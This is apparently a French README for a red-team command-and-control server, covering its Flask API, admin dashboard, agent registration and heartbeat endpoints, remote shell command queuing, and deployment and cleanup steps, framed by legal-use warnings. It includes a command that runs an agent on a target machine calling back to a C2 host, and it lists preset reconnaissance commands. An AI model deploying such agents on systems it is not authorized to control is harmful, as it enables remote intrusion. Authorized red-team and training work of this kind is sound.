# 🎯 Serveur C2 pour Red Team - Guide Complet

## ⚠️ AVERTISSEMENT LÉGAL

**USAGE LÉGAL UNIQUEMENT** - Ce serveur C2 est destiné exclusivement à :
- Tests de sécurité internes autorisés
- Exercices Red Team légaux
- Recherche en cybersécurité
- Formation en sécurité offensive

❌ **Toute utilisation malveillante est strictement interdite**

## 🏗️ Architecture du Système

```
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│   Admin Panel   │◄──►│   C2 Server     │◄──►│     Agents      │
│   (Web UI)      │    │   (Flask API)   │    │   (Clients)     │
└─────────────────┘    └─────────────────┘    └─────────────────┘
        │                       │                       │
        │                       ▼                       │
        │               ┌─────────────────┐              │
        └──────────────►│   SQLite DB     │◄─────────────┘
                        │   (Logs/Data)   │
                        └─────────────────┘
```

## 🚀 Installation Rapide

### Option 1: Déploiement Automatique VPS

```bash
git clone votre-repo.git
cd abdou.github.io
chmod +x deploy-c2.sh
./deploy-c2.sh
```

### Option 2: Test Local

```bash
# Installation des dépendances
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# Démarrage du serveur
python3 c2_server.py

# Dans un autre terminal - Test avec agent
python3 c2_agent.py --server http://localhost:5000 --test
```

## 🎛️ Fonctionnalités Principales

### 🔐 Authentification Sécurisée
- **JWT Tokens** - Authentification par tokens
- **Rôles Admin** - Gestion des permissions
- **Sessions Sécurisées** - Timeout automatique
- **Chiffrement** - Communications chiffrées

### 📡 Gestion des Agents
- **Enregistrement Auto** - Agents s'enregistrent automatiquement
- **Heartbeat** - Monitoring en temps réel
- **Capacités** - Détection des fonctionnalités de chaque agent
- **Statuts** - Online/Offline avec timestamps

### ⚡ Commandes & Contrôle
- **Exécution à Distance** - Commandes shell sécurisées
- **Queue Persistante** - Commandes en attente si agent offline
- **Résultats Temps Réel** - Via WebSocket ou polling
- **Historique Complet** - Toutes les commandes et résultats

### 📊 Monitoring & Logs
- **Dashboard** - Interface temps réel
- **Statistiques** - Agents, commandes, système
- **Logs d'Activité** - Traçabilité complète
- **Alertes** - Notifications d'événements

## 🌐 Endpoints API

### Authentification
```http
POST /api/auth/login
Content-Type: application/json

{
  "username": "admin",
  "password": "your_password"
}
```

### Gestion des Agents
```http
# Liste des agents
GET /api/agents
Authorization: Bearer <token>

# Commandes à un agent
POST /api/agents/{agent_id}/commands
Authorization: Bearer <token>
Content-Type: application/json

{
  "command": "whoami"
}

# Historique des commandes
GET /api/agents/{agent_id}/commands
Authorization: Bearer <token>
```

### Agents (Endpoints pour les clients)
```http
# Enregistrement
POST /api/agent/register
Content-Type: application/json

{
  "hostname": "target-host",
  "username": "user",
  "os_info": "Windows 10",
  "capabilities": ["cmd", "powershell"]
}

# Check-in (heartbeat)
POST /api/agent/{agent_id}/checkin

# Soumission de résultats
POST /api/agent/{agent_id}/result
Content-Type: application/json

{
  "command_id": 123,
  "result": "command output..."
}
```

## 🖥️ Interface d'Administration

### Accès au Panel Admin
1. Ouvrez `http://votre-serveur/admin`
2. Connectez-vous avec vos identifiants admin
3. Le dashboard s'affiche avec les statistiques temps réel

### Fonctionnalités du Dashboard
- **Vue d'ensemble** - Statistiques agents/commandes
- **Liste des agents** - Statut, info système, dernière activité
- **Console de commandes** - Interface pour envoyer des commandes
- **Historique** - Toutes les commandes et résultats
- **Monitoring** - Performance système du serveur

### Commandes Prédéfinies
Le panel inclut des boutons pour les commandes courantes :
- `whoami` - Utilisateur courant
- `pwd` - Répertoire courant
- `ls -la` / `dir` - Listing détaillé
- `ps aux` - Processus en cours
- `sysinfo` - Informations système complètes

## 🤖 Utilisation de l'Agent

### Déploiement Manuel
```bash
# Sur la machine cible
python3 c2_agent.py --server https://votre-c2.com
```

### Déploiement Automatisé
```bash
# Mode test avec commandes auto
python3 c2_agent.py --server https://votre-c2.com --test
```

### Capacités de l'Agent
- **Commandes Shell** - Exécution sécurisée
- **Navigation** - Changement de répertoire
- **Info Système** - Collecte d'informations
- **Sécurité** - Filtrage des commandes dangereuses
- **Chiffrement** - Communications sécurisées

## 🔒 Sécurité & Bonnes Pratiques

### Configuration Sécurisée
```bash
# Variables d'environnement obligatoires
export SECRET_KEY="votre-cle-secrete-complexe"
export JWT_SECRET_KEY="votre-jwt-secret"
export DEFAULT_ADMIN_PASSWORD="MotDePasseComplexe123!"

# Configuration SSL/TLS
certbot --nginx -d votre-domaine.com
```

### Firewall & Protection
```bash
# Ports nécessaires uniquement
ufw allow 22/tcp    # SSH
ufw allow 80/tcp    # HTTP (redirection)
ufw allow 443/tcp   # HTTPS
ufw allow 5000/tcp  # C2 Server (si pas de proxy)

# Fail2ban pour bruteforce
systemctl enable fail2ban
```

### Logs & Monitoring
```bash
# Logs du serveur C2
journalctl -u c2-server -f

# Logs d'accès web
tail -f /var/log/nginx/c2-server-access.log

# Monitoring des performances
./monitor.sh
```

## 📁 Structure des Fichiers

```
c2-server/
├── c2_server.py          # Serveur principal Flask
├── c2_agent.py           # Agent client
├── requirements.txt      # Dépendances Python
├── deploy-c2.sh         # Script de déploiement VPS
├── test-c2.sh           # Script de test
├── templates/
│   ├── index.html       # Page d'accueil
│   └── admin.html       # Interface admin
├── .env                 # Variables d'environnement
├── c2_server.db         # Base de données SQLite
└── README-C2.md         # Ce guide
```

## 🧪 Tests & Validation

### Test Complet Automatisé
```bash
./test-c2.sh
```

### Tests Manuels
```bash
# 1. Démarrer le serveur
python3 c2_server.py

# 2. Tester l'API
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"C2Admin123!"}'

# 3. Tester l'agent
python3 c2_agent.py --server http://localhost:5000 --test
```

### Validation de Sécurité
- ✅ Authentification requise pour toutes les API admin
- ✅ Chiffrement des communications sensibles
- ✅ Validation et filtrage des commandes dangereuses
- ✅ Logs complets pour audit
- ✅ Rate limiting sur les endpoints critiques

## 🚨 Scénarios d'Usage Légal

### 1. Tests de Pénétration Internes
```bash
# Déployer sur infrastructure de test
./deploy-c2.sh

# Simuler compromission avec agents
python3 c2_agent.py --server https://internal-c2.lab

# Tester détection par équipes bleues
# Documenter les résultats
```

### 2. Exercices Red Team
```bash
# Configuration pour exercice
export EXERCISE_NAME="RedTeam-Ex-2025"
export TARGET_SCOPE="lab-network.internal"

# Déploiement temporaire
./deploy-c2.sh

# Simulation d'attaque avec documentation
```

### 3. Formation Cybersécurité
```bash
# Environnement de formation isolé
docker-compose up -d

# Exercices pratiques encadrés
# Documentation pédagogique
```

## 📊 Monitoring & Métriques

### Métriques Clés
- **Agents Actifs** - Nombre d'agents connectés
- **Commandes/Heure** - Taux d'activité
- **Temps de Réponse** - Performance réseau
- **Taux d'Erreur** - Fiabilité des commandes

### Tableaux de Bord
- **Temps Réel** - Dashboard web live
- **Historique** - Tendances et analyses
- **Alertes** - Notifications importantes

## 🔧 Maintenance & Administration

### Commandes Utiles
```bash
# Statut du serveur
sudo systemctl status c2-server

# Redémarrage
sudo systemctl restart c2-server

# Monitoring
./monitor.sh

# Sauvegarde de la DB
./backup.sh

# Nettoyage des logs
journalctl --vacuum-time=7d
```

### Mise à Jour
```bash
git pull origin main
sudo systemctl restart c2-server
```

## ⚖️ Conformité & Documentation

### Documentation Obligatoire
- **Autorisation** - Écrite et signée
- **Scope** - Périmètre défini
- **Timeline** - Durée limitée
- **Rapport** - Résultats documentés

### Nettoyage Post-Test
```bash
# Arrêt du serveur
sudo systemctl stop c2-server

# Suppression des données
rm -f c2_server.db
rm -rf /var/log/nginx/c2-*

# Révocation des certificats si nécessaire
```

## 🆘 Dépannage

### Problèmes Courants

**Serveur ne démarre pas**
```bash
# Vérifier les logs
journalctl -u c2-server -n 50

# Vérifier les permissions
ls -la c2_server.py
```

**Agent ne se connecte pas**
```bash
# Tester la connectivité
curl -I http://votre-serveur:5000

# Vérifier le firewall
ufw status
```

**WebSocket déconnecté**
```bash
# Vérifier la configuration Nginx
nginx -t
systemctl reload nginx
```

## 📞 Support & Contact

Pour toute question sur l'utilisation légale et autorisée :
- Documentation complète dans ce guide
- Logs détaillés pour le debugging
- Tests automatisés inclus

---

**🛡️ RAPPEL FINAL : USAGE LÉGAL UNIQUEMENT**
**Respectez les lois locales et internationales**
**Obtenez les autorisations nécessaires avant usage**
